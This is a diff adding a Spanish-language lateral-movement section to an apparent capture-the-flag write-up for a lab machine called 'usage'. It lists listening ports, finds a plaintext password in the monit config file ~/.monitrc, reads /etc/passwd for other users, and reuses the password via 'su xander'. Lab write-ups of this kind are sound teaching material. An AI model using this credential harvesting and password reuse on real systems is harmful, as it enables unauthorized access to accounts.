@@ -214,6 +214,73 @@ dash@usage:/var/www/html/project_admin/public/uploads/images$
 <br>
 
 # Movimiento lateral
+Una vez realizada el tratamiento de la TTY para trabaja más comodamente, revisamos los puertos en escucha que tiene la máquina.
+```bash
+# netstat -putona | grep -i listen
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      5588/monit           off (0.00/0/0)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1279/nginx: worker   off (0.00/0/0)
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                    off (0.00/0/0)
+tcp6       0      0 :::22                   :::*                    LISTEN      -                    off (0.00/0/0)
+```
+
+El puerto TCP/2812 nos llama la atención. Una búsqueda en Internet nos revela que se trata de monit, que es un sistema de monitorización. 
+En la propia documentación de [monit](https://mmonit.com/monit/documentation/monit.html) podemos leer que el fichero de configuración de la aplicación, por defecto, se encuentra en el directorio del trabajo del usuario que lo ejecuta. El comando lsof nos puede ayudar a saber con qué usuario se ejecuta el programa. Descubrimos que es el usuaroi dash.
+```bash
+dash@usage:/var/www/html/project_admin/public/uploads/images$ lsof -i:2812
+COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+monit   5699 dash    5u  IPv4 202937      0t0  TCP localhost:2812 (LISTEN)
+```
+
+Nos dirigimos al directorio del usuario y listamos su contenido. Efectivamente, encontramos el fichero .monitrc.
+```bash
+dash@usage:~$ ls -la
+total 52
+drwxr-x--- 6 dash dash 4096 Nov  3 12:04 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw-r--r-- 1 dash dash    5 Nov  3 12:04 .monit.pid
+-rw------- 1 dash dash 1192 Nov  3 12:05 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+<contenido omitido>
+```
+
+Leemos su contenido y encontramos una clave.
+```bash
+  GNU nano 6.2                                                                                                      .monitrc                                                                                                               
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+<contenido omitido>
+```
+
+Revisamos que otros usuarios hay dados de alta en el sistema, leyendo el archivo /etc/passwd
+```bash
+dash@usage:~$ cat /etc/passwd | grep -i sh
+root:x:0:0:root:/root:/bin/bash
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+dash:x:1000:1000:dash:/home/dash:/bin/bash
+xander:x:1001:1001::/home/xander:/bin/bash
+```
+
+Probamos si se ha reutilizado la contraseña encontrada en el fichero .monitrc, consiguiendo realizar un movimiento lateral.
+```bash
+dash@usage:~$ su xander
+Password: 
+xander@usage:/home/dash$ 
+```
 
 <br>
 
